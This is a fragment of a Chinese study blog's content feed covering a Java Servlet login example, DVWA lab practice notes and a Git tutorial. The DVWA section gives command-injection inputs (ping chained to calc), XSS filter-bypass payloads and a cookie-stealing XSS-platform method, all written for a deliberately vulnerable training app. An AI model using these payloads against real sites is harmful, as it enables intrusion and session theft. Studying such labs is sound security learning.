class="comment">//获取所有已经注册过的用户数据</span></span><br><span class="line">        List&lt;User&gt; users=getUsers();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//定义一个flag</span></span><br><span class="line">        <span class="keyword">boolean</span> flag = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//遍历用户数据,这种遍历方式是一种新的遍历方式</span></span><br><span class="line">        <span class="keyword">for</span> (User user:users)&#123;</span><br><span class="line">            <span class="comment">//判断前端接收过来的用户名和密码是否已经注册，密码是否正确</span></span><br><span class="line">            <span class="comment">//equals判断字符串数值是否相等</span></span><br><span class="line">            <span class="keyword">if</span> (username.equals(user.getUsername()) &amp;&amp; password.equals(user.getPassword()))&#123;</span><br><span class="line">                flag=<span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="keyword">true</span>)&#123;</span><br><span class="line">            resp.getWriter().print(<span class="string">&quot;登录成功&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            resp.getWriter().print(<span class="string">&quot;登录失败&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取用户的容器</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;User&gt; <span class="title">getUsers</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个集合对象，用来存放用户数据</span></span><br><span class="line">        ArrayList&lt;User&gt; users = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建用户对象</span></span><br><span class="line">        User user1 = <span class="keyword">new</span> User(<span class="string">&quot;xiaoyao&quot;</span>, <span class="string">&quot;123456&quot;</span>);</span><br><span class="line">        User user2 = <span class="keyword">new</span> User(<span class="string">&quot;xiaoo&quot;</span>, <span class="string">&quot;1235&quot;</span>);</span><br><span class="line">        User user3 = <span class="keyword">new</span> User(<span class="string">&quot;xiaao&quot;</span>, <span class="string">&quot;12356&quot;</span>);</span><br><span class="line">        User user4 = <span class="keyword">new</span> User(<span class="string">&quot;xao&quot;</span>, <span class="string">&quot;12346&quot;</span>);</span><br><span class="line">        User user5 = <span class="keyword">new</span> User(<span class="string">&quot;xiayao&quot;</span>, <span class="string">&quot;13456&quot;</span>);</span><br><span class="line">        User user6 = <span class="keyword">new</span> User(<span class="string">&quot;xiao&quot;</span>, <span class="string">&quot;12346&quot;</span>);</span><br><span class="line">        User user7 = <span class="keyword">new</span> User(<span class="string">&quot;xiaoao&quot;</span>, <span class="string">&quot;23456&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//存放用户数据到集合</span></span><br><span class="line">        users.add(user1);</span><br><span class="line">        users.add(user2);</span><br><span class="line">        users.add(user3);</span><br><span class="line">        users.add(user4);</span><br><span class="line">        users.add(user5);</span><br><span class="line">        users.add(user6);</span><br><span class="line">        users.add(user7);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> users;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在前端页面<a href="http://localhost:8080/web/jsp/login.jsp">http://localhost:8080/web/jsp/login.jsp</a> 中输入用户名和密码，提交后，跳转到<a href="http://localhost:8080/web/login">http://localhost:8080/web/login</a> 并显示<em>登录成功</em>，服务器后台打印数据：</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210611212442133.png" alt="image-20210611212442133"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210611212215668.png" alt="image-20210611212215668"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 后端 </tag>
            
            <tag> Servlet </tag>
            
            <tag> Tomcat </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA靶场练习</title>
      <link href="2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/DVWA%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/"/>
      <url>2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/DVWA%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><ul><li><p>使用DVWA靶场，默认用户名密码是admin，mm：password，使用php的数据库，数据库root</p></li><li><p>这个靶场主要用来学习主流的几种攻击方式</p></li></ul><hr><h3 id="brute-force"><a href="#brute-force" class="headerlink" title="brute force"></a>brute force</h3><h4 id="burpsuit-intruder模块"><a href="#burpsuit-intruder模块" class="headerlink" title="burpsuit intruder模块"></a>burpsuit intruder模块</h4><ul><li>brute force 暴力破解</li><li>结合burpsuit使用send to intruder，实战中同一个ip密码错误2次就会别封掉，因此会结合一些代理使用。比如”爬虫代理“</li><li>现实中就是高级别的难度，比如密码加密，验证码。</li><li>验证码解决方案：</li><li><ul><li>花钱解决：“打码平台”；</li><li>智商解决：人工智能识别，github不共享</li></ul></li></ul><h5 id="四种模式"><a href="#四种模式" class="headerlink" title="四种模式"></a>四种模式</h5><ul><li>sinper模式，单向爆破，知道用户名不知道密码，破解一些输入框，比如论坛可以看到用户名不知道密码</li><li>battering ram模式用的比较少，并发攻击，对多个目标进行单一的payload攻击，也就是用户名和密码一样的情况（工号，学号）</li><li>pitchfork模式，交叉攻击（撞库）有几个变量就选择几个字典，实际中居然试出来是最多的这种方法</li><li>cluster bomb模式，穷举模式，完整的爆破，比较靠谱</li></ul><hr><h3 id="command-injection"><a href="#command-injection" class="headerlink" title="command injection"></a>command injection</h3><p>命令执行漏洞：一个地方可以执行OS命令</p><p>当DVWA在win7上时：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ping <span class="number">127.0</span>.<span class="number">0.1</span>&amp;&amp;calc <span class="comment">#直接弹出计算器</span></span><br><span class="line"><span class="comment">#将&amp;&amp;添加为过滤时</span></span><br><span class="line">ping <span class="number">127.0</span>.<span class="number">0.1</span>&amp;calc <span class="comment">#字符屏蔽数组中没有$</span></span><br><span class="line"><span class="comment">#调至高级别时</span></span><br><span class="line">ping <span class="number">127.0</span>.<span class="number">0.1</span>|calc <span class="comment">#只屏蔽了|空格，但是|本身未被屏蔽</span></span><br></pre></td></tr></table></figure><p>这需要看懂后端php处理的代码。</p><p>这也是代码审计的思路</p><p>impossible级别的代码写的很安全</p><h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><p>medium级别，post提交，burp抓包，send to repeater测试</p><p>high级别需要突破防火墙，会把代码特殊字符转义掉，需要突破php 的mysqli_real_eacape_string()函数</p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><ul><li>XSS多半是前端的漏洞</li><li>特别好找漏洞，基本没有什么黑盒测试，而且大佬网站也有</li></ul><h4 id="存储型跨站脚本攻击（Stored-Cross-Site-Scripting）"><a href="#存储型跨站脚本攻击（Stored-Cross-Site-Scripting）" class="headerlink" title="存储型跨站脚本攻击（Stored Cross Site Scripting）"></a>存储型跨站脚本攻击（Stored Cross Site Scripting）</h4><p>比如留言板，写入留言板的信息会被附在网站上，留言放在数据库，每次都从数据库中选出留言渲染到前端</p><p>js脚本代码可以放在html的任意地方，这里代码就是存储在留言信息数据库中</p><p>因此可以把js放在留言文字中，从而实现每次访问带有该留言的页面，在渲染前端的时候都会执行该js代码。</p><hr><p>有很多XSS平台比如 xsshs.cn</p><p>这里以默认模块为例：</p><p>平台生成的代码已经做过屏蔽处理了，也可以自行魔改</p><p>将代码复制到留言板，执行</p><p>在平台的项目处就可以获得网站登录的cookie等信息（之前斗鱼的例子，弹幕xss）</p><hr><h5 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h5><p>普通未屏蔽的js代码，会把标签&lt;包裹去掉script，同时会把引号转义掉</p><ul><li><p>如果屏蔽只执行一次，可以尝试写两次script，用嵌套结构，实现删除一次标签之后剩余的能再次形成</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">haha&lt;scr&lt;script&gt;ipt&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>或者更改大小写，如果没有对数据全部进行小写的话</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">haha&lt;sCIPt&gt;alert(<span class="number">1</span>)&lt;/sCRipT&gt;</span><br></pre></td></tr></table></figure></li><li><p>这里在message框中没救了，因为php中用了addslashes函数,对字符都进行了转义，考虑从name入手</p></li><li><p>（二进制）？</p></li></ul><p>图片无法加载也可以触发js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&#x27;x&#x27;</span> onerror=<span class="string">&#x27;alert(1)&#x27;</span>/&gt; 这里好像只能是数字</span><br></pre></td></tr></table></figure><p>长度限制就配合burp使用</p><hr><h5 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h5><p>查看php源码发现将script每个字符都处理了</p><p>考虑用img</p><p>可以突破</p><hr><p>要点在于灵活变通</p><h3 id="Weak-Session-IDs"><a href="#Weak-Session-IDs" class="headerlink" title="Weak Session IDs"></a>Weak Session IDs</h3><p>脆弱的session id</p><p>用户访问网站，网站一般会分配给一个用户单独的session，如果这个session id可以伪造的话，就可以不需要密码和用户名访问服务器内容</p><p>这题的意义在于：提示有些网站是通过什么方法验证用户的session，有的网站用户登录后会给一个session id作为用户的标识，如果通过伪造，就有可能不通过用户名密码登录对方账号</p><p>medium是使用时间来作为session id，这种可以用burp穷举。</p><p>high是用md5加密之后的</p><p>实战中对这个漏洞有另外的用法</p><hr><h3 id="CSP-Bypass"><a href="#CSP-Bypass" class="headerlink" title="CSP Bypass"></a>CSP Bypass</h3><p>浏览器安全策略 content security policy</p><p>对XSS有防御作用的一个东西</p><p>在网页源代码中有限制$headCSP=</p><p>只允许执行某些网站的东西，那你就想办法到这个网站上写一个js</p><p><a href="https://pastebin.com/">https://pastebin.com</a></p><hr><p>medium级别</p><p>unsafe-inline 允许使用内联资源，JavaScript:xxx.com onclick style</p><p>nonce-source 允许特定内联模块 nonce=“TmV2 ZXIgZ29pbmcgdG8gZ212 ZSB5b3UgdXA=” （base64）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce=“TmV2ZXIgZ29pbmcgdG8gZ212 ZSB5b3UgdXA=”&gt; alert(<span class="number">1</span>) &lt;/script&gt;</span><br></pre></td></tr></table></figure><p>high级别涉及到加密</p><p>CSP策略主要是验证来源的合法性</p><hr><h3 id="JavaScript-Attacks"><a href="#JavaScript-Attacks" class="headerlink" title="JavaScript Attacks"></a>JavaScript Attacks</h3><p>js攻击（重要）</p><p>攻击web前端安全</p><p>low难度的就是在提交时验证提前在隐藏按钮中写死的数值，这个数值是将输入内容通过js用rot和md5加密之后得到的。</p><p>在控制台输入md5(rot3(“success”));得到token</p><hr><p>medium难度</p><p>首先需要知道token的算法是什么，看懂token算法的js代码，然后逆推</p><p>先查看原码，百度，js代码格式化</p><p>XXsuccessXX</p><p>XXsseccusXX</p><hr><p>high级别</p><p>查看源码，根据经验发现是加密过的</p><p>解密特征混淆算法的网站</p><p><a href="http://deobfuscatejavascript.com/">http://deobfuscatejavascript.com</a></p><blockquote><p>课上在控制台中重写的这部分代码好像有问题</p><p>使用默认的changeme也得不到默认token的值，这个问题等js再学学再说吧，感觉也有可能是网站这代码的问题，总感觉前面算到的后面没用上</p><p>e=”ChangeMe”<br>for (var t = “”, n = e.length - 1; n &gt;= 0; n–) t += e[n];<br>t=sha256(“XX”+t)<br>token=sha256(t+”ZZ”)</p><p>//document.getElementById(“phrase”).value = “”;<br>//aa=document.getElementById(“token”).value;<br>//part2=sha256(“XX”+aa);<br>//part3=sha256(part2+”ZZ”);<br>//e=”success”<br>//for (var t = “”, n = e.length - 1; n &gt;= 0; n–) t += e[n];</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DVWA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git-learning</title>
      <link href="2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/git%E4%BD%BF%E7%94%A8/"/>
      <url>2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/git%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="Simple-Case"><a href="#Simple-Case" class="headerlink" title="Simple-Case"></a>Simple-Case</h2><p>git clone <a href="mailto:&#103;&#x69;&#x74;&#64;&#103;&#105;&#x74;&#x68;&#117;&#98;&#46;&#99;&#x6f;&#x6d;">&#103;&#x69;&#x74;&#64;&#103;&#105;&#x74;&#x68;&#117;&#98;&#46;&#99;&#x6f;&#x6d;</a>:liloker/repositoryname.git<br>cd repositoryname<br>coding coding new tile added<br>git add .<br>git commit -m “description added”<br>git push</p><h2 id="生成与发送key"><a href="#生成与发送key" class="headerlink" title="生成与发送key"></a>生成与发送key</h2><p><a href="https://gitee.com/help/articles/4181#article-header0">https://gitee.com/help/articles/4181#article-header0</a>      gitee生成使用key，win11用户/ssh目录下密钥文件名不能改，会不认，比如ed25519</p><p>github支持多种加密方式，比如rsa，ed25519这种基于sha-512的签名</p><p>在Hexo中，可以通过在_config.yml文件中设置deploy参数来进行部署。在这个配置中，如果设置了Git相关的参数，例如repository、branch等，Hexo的deploy命令将使用您在Git全局变量中配置的用户名和邮箱来进行提交，如果修改了Git全局变量，建议在执行Hexo的deploy命令之前，重新认证或者重新设置相关的参数</p><p>在使用 SSH 连接到远程主机时，可以通过 <code>-i</code> 参数指定要使用的密钥文件，例如：ssh -i ~/.ssh/my_key user@remote_host</p><h2 id="下载安装git"><a href="#下载安装git" class="headerlink" title="下载安装git"></a>下载安装git</h2><p>sudo apt-get install git 跨平台  老版本叫git-core<br>win 官网下客户端，git bash</p><p>配置全局变量，所有的git仓库用此变量，一台电脑只能使用一个全局变量来指定用户名和邮箱。<br>git global 设置全局变量<br>git config –global –list 查看当前.git的全局变量<br>git config –list 查看当前项目的配置（包括全局和本地）<br>git config –global user.name 只查看username<br>git config –global user.name “Your Name”   global所有Git仓库都会使用这个配置<br>git config –global user.email “<a href="mailto:&#x65;&#109;&#x61;&#x69;&#x6c;&#64;&#x65;&#120;&#x61;&#109;&#x70;&#x6c;&#x65;&#x2e;&#x63;&#111;&#x6d;">&#x65;&#109;&#x61;&#x69;&#x6c;&#64;&#x65;&#120;&#x61;&#109;&#x70;&#x6c;&#x65;&#x2e;&#x63;&#111;&#x6d;</a>“<br>git config –global color.ui true 让git显示颜色</p><h2 id="初始化仓库与提交到仓库"><a href="#初始化仓库与提交到仓库" class="headerlink" title="初始化仓库与提交到仓库"></a>初始化仓库与提交到仓库</h2><p>git init 把当前目录变为git可管理的仓库，会多一个.git<br>git add filename.txt file2.txt file3.txt 推到本地git仓库（git init之后的目录就是仓库）<br>git add . 把当前目录下所有文件添加到git的暂存区<br>git rm –cached fw.tar.gz orca.tar.gz t同下功能<br>git status<br>git reset HEAD a.tar 把a.tar从暂存区移除，文件仍然保存在工作目录中<br>git commit -m “commit说明” 将这些更改提交到本地仓库<br>git push 将这些提交记录推送到远程仓库<br>git config –list 可查看当前remote.origin<br>git status 查看本地仓库在下一次commit之前有哪些变化<br>git diff可以追踪到文本中变化的内容<br>git diff HEAD – readme.txt 查看工作区和版本库里的master分支版本的区别</p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>工作区：你创建编辑文件的目录<br>版本库：git init之后产生的.git隐藏文件目录<br>暂存区：版本库里的stage部分，git add就是把工作区文件转交给暂存区<br>分支区：git自动创建的第一个分支master，HEAD是指向其的第一个指针，git commit就是把暂存区内容转交给master上</p><h2 id="穿梭"><a href="#穿梭" class="headerlink" title="穿梭"></a>穿梭</h2><p>git log 查看历史记录<br>git log –pretty=oneline 简介看<br>git reset –hard HEAD^ 回到上一个版本 HEAD^^两个就是上上个版本 HEAD~100是上100个版本<br>git reset –hard 1094a 以commit id的前几位为标识，回到过去<br>git reflog 记录git命令的日志，可以找到从过去回到现在的id</p><h2 id="撤销"><a href="#撤销" class="headerlink" title="撤销"></a>撤销</h2><p>git checkout – readme.txt 撤销工作区和暂存区的修改，git本质上是记录与管理“修改”的工具，如果没有–就变成切换到另一个分支的命令。把暂存区替换到工作区的</p><p>git reset HEAD readme.txt 把暂存区的修改撤销(unstage)，重新放回工作区，HEAD表示最新版本</p><p>1.没有git add时，用git checkout – file<br>2.已经git add时，先git reset HEAD <file>回退到1.，再按1.操作<br>git checkout是工作区回退，git reset HEAD <file>是暂存区回退<br>3.已经git commit时，用git reset回退版本</p><h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><p>git add test.txt<br>git commit test.txt<br>rm test.txt<br>git status 此时git发现你在工作区删除了test.txt,与版本库不一致，该命令会告诉哪些文件被删除<br>git rm test.txt 从版本库中删除test.txt<br>git commit -m “remove test.txt”<br>git checkout – test.txt 如果工作区的是误删，可用版本库里的替换工作区的版本</p><h2 id="添加到远程库"><a href="#添加到远程库" class="headerlink" title="添加到远程库"></a>添加到远程库</h2><p>git init 在当前项目文件夹下创建.git工作区</p><p>想让本地git库与github的git库同步<br>git remote add origin <a href="mailto:&#x67;&#x69;&#x74;&#x40;&#x67;&#105;&#x74;&#104;&#117;&#x62;&#46;&#99;&#x6f;&#109;">&#x67;&#x69;&#x74;&#x40;&#x67;&#105;&#x74;&#104;&#117;&#x62;&#46;&#99;&#x6f;&#109;</a>:liloker/repositoryname.git 本地关联远程库，origin是习惯命名远程仓库<br>将本地计算机的ssh公钥添加到github自己账户列表中，git基于ssh连接<br>git push -u origin master 把本地库master分支推送到远程库，u把两仓库的master关联，便于以后推送与拉取<br>git push origin master 本地commit之后就可推送<br>git remote -v 查看远程库信息<br>git remote rm origin 删除origin库，这里是解除与远程库的连接，不是真删除远程仓库</p><h2 id="从远程库克隆"><a href="#从远程库克隆" class="headerlink" title="从远程库克隆"></a>从远程库克隆</h2><p>git clone <a href="mailto:&#x67;&#x69;&#116;&#x40;&#103;&#105;&#116;&#x68;&#x75;&#x62;&#46;&#x63;&#111;&#x6d;">&#x67;&#x69;&#116;&#x40;&#103;&#105;&#116;&#x68;&#x75;&#x62;&#46;&#x63;&#111;&#x6d;</a>:liloker/repositoryname.git<br>cd repositoryname<br>ls即可看到<br>GitHub给出的地址不止一个，还可以用<a href="https://github.com/liloker/repositoryname.git%E8%BF%99%E6%A0%B7%E7%9A%84%E5%9C%B0%E5%9D%80%E3%80%82%E5%AE%9E%E9%99%85%E4%B8%8A%EF%BC%8CGit%E6%94%AF%E6%8C%81%E5%A4%9A%E7%A7%8D%E5%8D%8F%E8%AE%AE%EF%BC%8C%E9%BB%98%E8%AE%A4%E7%9A%84git://%E4%BD%BF%E7%94%A8ssh%EF%BC%8C%E4%BD%86%E4%B9%9F%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8https%E7%AD%89%E5%85%B6%E4%BB%96%E5%8D%8F%E8%AE%AE%E3%80%82">https://github.com/liloker/repositoryname.git这样的地址。实际上，Git支持多种协议，默认的git://使用ssh，但也可以使用https等其他协议。</a><br>使用https除了速度慢以外，还有个最大的麻烦是每次推送都必须输入口令，但是在某些只开放http端口的公司内部就无法使用ssh协议而只能用https。</p><h2 id="分支切换"><a href="#分支切换" class="headerlink" title="分支切换"></a>分支切换</h2><p>分支就是时间线，HEAD指向当前分支，master才指向提交<br>git checkout -b dev 创建并-b切换到dev分支，dev指针此时与master指针指向相同<br>git switch -c dev 同上效果，比checkout更好理解<br>git branch dev查看当前分支<br>git checkout dev切换到dev分支<br>git branch 列出所有分支，当前分支会标记为*<br>git add readme.txt<br>git commit -m “branch test” 正常提交到dev分支<br>git checkout master切换到master分支<br>git switch master 切换到master分支<br>git merge dev 把dev分支的工作成果合并到master分支上，fast-forward指把master指向dev指针位置<br>git branch -d dev删除dev分支，本质上时删除dev指针<br>git branch 发现当前只剩下master分支</p><h2 id="分支冲突合并"><a href="#分支冲突合并" class="headerlink" title="分支冲突合并"></a>分支冲突合并</h2><p>当在master分支上修改了readme.txt与在分支dev上修改了readme.txt的同一句话时，在git merge时提示confilict<br>git status查冲突文件<br>打开文件，git标记了冲突段落，修改后git add readme.txt git commit -m “confict fixed”（这里指修改合并后master上应该保留冲突中的哪种，feature分支本身并不会被改变）<br>合并之后，feature分支都不会发生变化。<br>git log –graph –pretty=oneline –abbrev-commit 查看分支的合并情况<br>git branch -d feature 删除feature分支</p><h2 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h2><p>通常，合并分支时，如果可能，Git会用Fast forward模式，但这种模式下，删除分支后，会丢掉分支信息。<br>如果要强制禁用Fast forward模式，Git就会在merge时生成一个新的commit，这样，从分支历史上就可以看出分支信息<br>git switch -c dev<br>git add readme.txt<br>git commit -m “add merge”<br>git switch master<br>git merge –no-ff -m “merge with no-ff” dev这里–no-ff参数，普通模式合并，表示禁用Fast forward，fast forward合并就看不出来曾经做过合并<br>git log<br>一般master分支应该是非常稳定的，也就是仅用来发布新版本；<br>干活都在dev分支上，也就是说，dev分支是不稳定的，到某个时候，比如1.0版本发布时，再把dev分支合并到master上，在master分支发布1.0版本，每个人都有自己的分支，时不时地往dev分支上合并就可以了。</p><h2 id="bug分支处理"><a href="#bug分支处理" class="headerlink" title="bug分支处理"></a>bug分支处理</h2><p>当你接到一个修复一个代号101的bug的任务时，很自然地，你想创建一个分支issue-101来修复它，但是，等等，当前正在dev上进行的工作还没有提交<br>git status<br>并不是你不想提交，而是工作只进行到一半，还没法提交，预计完成还需1天时间。但是，必须在两个小时内修复该bug，怎么办？<br>Git提供了一个stash功能，可以把当前工作现场“储藏”起来，等以后恢复现场后继续工作：<br>git stash<br>git status查看工作区，就是干净的（除非有没有被Git管理的文件），因此可以放心地创建分支来修复bug<br>git checkout master首先确定要在哪个分支上修复bug，假定需要在master分支上修复，就从master创建临时分支<br>git add readme.txt<br>git commit -m “fix bug 101”<br>git switch master<br>git merge –no-ff -m “merged bug fix 101” issue-101 合并完成<br>git switch dev 回到dev分支继续干活<br>git status<br>git stash list工作区是干净的，刚才的工作现场存到哪去了？用git stash list命令看看<br>工作现场还在，Git把stash内容存在某个地方了，但是需要恢复一下，有两个办法<br>git stash pop，恢复的同时把stash内容也删了<br>git stash apply恢复，但是恢复后，stash内容并不删除，你需要用git stash drop来删除<br>git stash list 恢复后此时看不到stash内容了<br>git stash apply stash@{0} 可以多次stash，恢复的时候，先用git stash list查看，然后恢复指定的stash<br>在master分支上修复了bug后，我们要想一想，dev分支是早期从master分支分出来的，所以，这个bug其实在当前dev分支上也存在。那怎么在dev分支上修复同样的bug？<br>同样的bug，要在dev上修复，我们只需要把4c805e2 fix bug 101这个提交所做的修改“复制”到dev分支<br>git branch<br>git cherry-pick 4c805e2 复制一个特定编号的fixbug提交到当前分支</p><h2 id="新功能分支处理"><a href="#新功能分支处理" class="headerlink" title="新功能分支处理"></a>新功能分支处理</h2><p>现在，你终于接到了一个新任务：开发代号为Vulcan的新功能<br>git switch -c feature-vulcan<br>git add vulcan.py<br>git commit -m “add feature vulcan”<br>git switch dev回到dev分支，准备合并<br>一切顺利的话，feature分支和bug分支是类似的，合并，然后删除。但是！就在此时，接到上级命令，因经费不足，新功能必须取消！虽然白干了，但是这个包含机密资料的分支还是必须就地销毁<br>git branch -d feature-vulcan报错git，feature-vulcan分支还没有被合并，如果删除，将丢失掉修改，如果要强行删除，需要使用大写的-D参数<br>git branch -D feature-vulcan</p><h2 id="多人协作"><a href="#多人协作" class="headerlink" title="多人协作"></a>多人协作</h2><p>git remote -v显示远程库信息<br>git push origin master把该分支上的所有本地提交推送到远程库<br>git push origin dev 推送到其他分支dev分支<br>git clone <a href="mailto:&#103;&#105;&#116;&#64;&#103;&#105;&#x74;&#104;&#x75;&#98;&#46;&#x63;&#111;&#x6d;">&#103;&#105;&#116;&#64;&#103;&#105;&#x74;&#104;&#x75;&#98;&#46;&#x63;&#111;&#x6d;</a>:michaelliao/learngit.git 默认只克隆master分支<br>git branch查看分支<br>git checkout -b dev origin/dev在本地创建dev分支<br>git add env.txt<br>git commit -m “add env”<br>git push origin  把dev分支push到远程<br>你的小伙伴已经向origin/dev分支推送了他的提交，而碰巧你也对同样的文件作了修改，并试图推送<br>因为你的小伙伴的最新提交和你试图推送的提交有冲突，解决办法也很简单，Git已经提示我们，先用git pull把最新的提交从origin/dev抓下来，然后，在本地合并，解决冲突，再推送<br>git pull也失败了，提示no tracking information原因是没有指定本地dev分支与远程origin/dev分支的链接，根据提示，设置dev和origin/dev的链接<br>git branch –set-upstream-to=origin/dev dev<br>git pull 此时pull到本地成功<br>修改后push时提示合并有冲突，需要手动解决，解决的方法和分支管理中的解决冲突完全一样。解决后，提交，再push</p><h2 id="Rebase变基操作"><a href="#Rebase变基操作" class="headerlink" title="Rebase变基操作"></a>Rebase变基操作</h2><p>略，基本用不到</p><h2 id="分支标签"><a href="#分支标签" class="headerlink" title="分支标签"></a>分支标签</h2><p>git branch<br>git checkout master 查看并切换到你要打标签的分支上<br>git tag v1.0 打上1.0标签<br>git tag 查看标签，标签是指向commit的死指针，分支是指向commit的活指针<br>git log –pretty=oneline –abbrev-commit<br>git tag v0.9 f52c633 对历史commit的id为f52c的打v0.9标签，默认标签打在当前分支的最新commit上的<br>git tag<br>git show v0.9查看标签信息，标签不按照时间顺序列出，而是按照字母排序<br>git tag -a v0.1 -m “version 0.1 released” 创建带有说明的标签，用-a指定标签名，-m指定说明文字<br>git show v0.1<br>git tag -d v0.1 删除标签<br>git push origin v1.0 推送标签到远程，前面都是在本地打标签<br>git push origin –tags 一次性推送所有未推送的标签<br>git push origin :refs/tags/v0.9 删除远程的标签命令也是push</p><h2 id="github使用"><a href="#github使用" class="headerlink" title="github使用"></a>github使用</h2><p>先fork到自己仓库，自己拥有fork后的仓库的读写权限<br>git clone <a href="mailto:&#x67;&#105;&#116;&#64;&#x67;&#105;&#x74;&#x68;&#117;&#x62;&#x2e;&#99;&#111;&#x6d;">&#x67;&#105;&#116;&#64;&#x67;&#105;&#x74;&#x68;&#117;&#x62;&#x2e;&#99;&#111;&#x6d;</a>:michaelliao/bootstrap.git 然后克隆到本地<br>如果你想修复bootstrap的一个bug，或者新增一个功能，立刻就可以开始干活，干完后，往自己的仓库推送。<br>如果你希望bootstrap的官方库能接受你的修改，你就可以在GitHub上发起一个pull request。当然，对方是否接受你的pull request就不一定了，练习<a href="https://github.com/michaelliao/learngit">https://github.com/michaelliao/learngit</a></p><h2 id="gitee使用"><a href="#gitee使用" class="headerlink" title="gitee使用"></a>gitee使用</h2><p>5人以下小团队免费，国内<br>用户主目录下的.ssh/id_rsa.pub上传<br>git remote add origin <a href="mailto:&#103;&#x69;&#116;&#64;&#103;&#x69;&#x74;&#x65;&#101;&#x2e;&#x63;&#111;&#x6d;">&#103;&#x69;&#116;&#64;&#103;&#x69;&#x74;&#x65;&#101;&#x2e;&#x63;&#111;&#x6d;</a>:liloker/learngit.git 报错remote origin already exists<br>git remote -v<br>git remote rm origin删除已有的GitHub远程库关联<br>git remote add github <a href="mailto:&#103;&#x69;&#116;&#x40;&#x67;&#105;&#x74;&#x68;&#117;&#98;&#x2e;&#x63;&#111;&#x6d;">&#103;&#x69;&#116;&#x40;&#x67;&#105;&#x74;&#x68;&#117;&#98;&#x2e;&#x63;&#111;&#x6d;</a>:michaelliao/learngit.git 也可以通过修改远程库名称来解决报错同时关联两个<br>git push github master<br>git push gitee master 推送到对应名称的远程库<br>练习<a href="https://gitee.com/liaoxuefeng/learngit">https://gitee.com/liaoxuefeng/learngit</a></p><h2 id="gitignore文件写入忽略特殊文件"><a href="#gitignore文件写入忽略特殊文件" class="headerlink" title=".gitignore文件写入忽略特殊文件"></a>.gitignore文件写入忽略特殊文件</h2><p>在Git工作区的根目录下创建一个特殊的.gitignore文件，然后把要忽略的文件名填进去，Git就会自动忽略这些文件，windows中点在文本编辑器里“保存”或者“另存为”<br>假设你在Windows下进行Python开发，Windows会自动在有图片的目录下生成隐藏的缩略图文件，如果有自定义目录，目录下就会有Desktop.ini文件，因此你需要忽略Windows自动生成的垃圾文件：<br>Thumbs.db<br>ehthumbs.db<br>Desktop.ini<br>然后，继续忽略Python编译产生的.pyc、.pyo、dist等文件或目录</p><p>Python:</p><p>*.py[cod]<br>*.so 正则匹配<br>*.egg<br>*.egg-info<br>dist<br>build<br>加上自己定义的文件</p><p>My configurations:</p><p>db.ini<br>deploy_key_rsa<br>把.gitignore也提交到Git，就完成了！检验.gitignore的标准是git status命令是不是说working directory clean<br>git add -f App.class 由于.gitignore写的有问题导致必须强行添加<br>git check-ignore -v App.class 检查哪个规则有问题</p><h2 id="配置别名"><a href="#配置别名" class="headerlink" title="配置别名"></a>配置别名</h2><p>git config –global alias.st status 把status叫做st<br>git st<br>git config –global alias.co checkout<br>git config –global 